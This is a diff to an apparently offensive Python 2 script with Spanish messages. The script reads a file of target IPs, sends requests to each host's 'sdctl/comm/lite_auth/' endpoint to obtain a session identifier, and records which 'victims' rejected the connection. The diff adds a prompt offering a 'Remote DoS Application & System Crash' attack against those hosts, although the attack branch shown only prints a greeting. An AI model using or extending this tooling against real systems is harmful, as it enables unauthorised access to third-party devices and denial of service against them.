@@ -8,7 +8,14 @@
 # \                                                 \
 # --------------------------------------------------
 
-import requests, sys, json, pprint, time, os
+import requests, sys, json, pprint, time, os, signal
+
+def handler(signum, frame):
+
+        print '\nSaliendo...\n'
+        os.system('setterm -cursor on')
+        sys.exit(0)
+
 
 def get_identifier(r_json):
         identifier_session = r_json["7bb"]
@@ -63,6 +70,7 @@ if __name__ == '__main__':
 	s = requests.Session()
 
 	active_urls = []
+	rejected_domains = []
 
 	with open('ips') as active_domains:
 		active_urls = active_domains.read().splitlines()
@@ -72,6 +80,7 @@ if __name__ == '__main__':
 
 	        accept_me = url + 'sdctl/comm/lite_auth/'
 		print "[*] Enviando petición al objetivo " + url + "...\n"
+
 		try:
 		      	r = s.get(accept_me)
 		        r_json = json.loads(r.content)
@@ -99,6 +108,26 @@ if __name__ == '__main__':
 
 		        else:
 		        	print "El objetivo ha rechazado nuestra petición, chico listo...\n"
+				rejected_domains.append(url)
 	        except:
 	        	print "\nError... ¿tal vez la IP no está activa?\n"
 	                sys.exit(0)
+
+	print "[*] Listado de víctimas que no aceptaron la conexión:\n"
+	time.sleep(2)
+
+	for rejected_request in rejected_domains:
+		print rejected_request[:-1]
+	time.sleep(1)
+
+	print "\n[*] Casi mejor que hubieran aceptado...\n"
+	time.sleep(1)
+	response = raw_input("[*] ¿Deseas iniciar el ataque 'Remote DoS Application & Sytem Crash' contra las víctimas listadas? <y/n>: ")
+
+	if response == "y":
+		print "\nHola\n"
+		os.system('setterm -cursor on')
+	else:
+		print "\nSaliendo del programa...\n"
+		os.system('setterm -cursor on')
+		sys.exit(0)
